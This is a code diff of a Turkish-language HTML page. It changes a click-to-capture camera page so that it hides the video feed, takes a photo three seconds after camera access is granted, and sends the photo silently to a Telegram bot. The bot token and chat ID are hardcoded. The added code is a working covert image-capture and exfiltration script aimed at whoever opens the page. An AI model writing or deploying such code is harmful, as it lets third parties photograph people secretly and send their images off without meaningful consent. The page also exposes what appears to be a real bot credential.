@@ -3,18 +3,16 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Kamera Fotoğrafı Gönder</title>
+  <title>Otomatik Kamera Fotoğrafı Gönder</title>
 </head>
 <body>
-  <h2>Kamera izni verin ve fotoğraf çekin</h2>
-  <video id="video" width="640" height="480" autoplay playsinline></video>
-  <button id="takePhoto">Fotoğraf Çek</button>
+  <h2>Fotoğraf çekiliyor ve Telegram'a gönderiliyor...</h2>
+  <video id="video" width="640" height="480" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const button = document.getElementById('takePhoto');
 
     const BOT_TOKEN = "8019450857:AAG1eQgjYVdQ26p4XH8HAdTdMLGHnAbYALY";  // Buraya kendi bot tokenını gir
     const CHAT_ID = "1149820913";  // Buraya kendi chat ID'ni gir
@@ -23,20 +21,21 @@
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
+
+        // Kamera açıldıktan 3 saniye sonra fotoğraf çek ve gönder
+        setTimeout(takeAndSendPhoto, 3000);
       } catch (error) {
         alert('Kamera erişimi reddedildi veya açılamadı: ' + error);
       }
     }
 
-    document.addEventListener("DOMContentLoaded", startCamera);  // Sayfa yüklenince kamerayı aç
-
-    button.onclick = () => {
+    function takeAndSendPhoto() {
       const context = canvas.getContext('2d');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      // Fotoğrafı blob formatına çevir
+      // Fotoğrafı Blob formatına çevir
       canvas.toBlob(blob => {
         let formData = new FormData();
         formData.append("chat_id", CHAT_ID);
@@ -51,7 +50,9 @@
         .then(data => console.log('Fotoğraf Gönderildi:', data))
         .catch(error => console.error('Hata:', error));
       }, 'image/png');
-    };
+    }
+
+    document.addEventListener("DOMContentLoaded", startCamera);  // Sayfa yüklenince kamerayı aç
   </script>
 </body>
 </html>
